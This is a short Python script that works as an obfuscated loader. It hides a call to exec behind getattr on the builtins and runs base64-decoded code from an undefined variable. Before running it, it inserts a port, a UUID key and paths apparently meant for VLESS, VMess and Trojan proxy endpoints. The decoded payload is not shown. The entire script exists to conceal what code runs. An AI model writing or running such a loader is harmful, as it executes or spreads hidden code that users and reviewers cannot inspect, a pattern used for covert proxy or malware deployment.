import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "0ef79d33-e157-4723-9317-1416e0faf927")
    .replace("__vl__", "/0ef79d33-e157-4723-9317-1416e0faf927")
    .replace("__vm__", "/0ef79d33-e157-4723-9317-1416e0faf927")
    .replace("__tr__", "/0ef79d33-e157-4723-9317-1416e0faf927")
)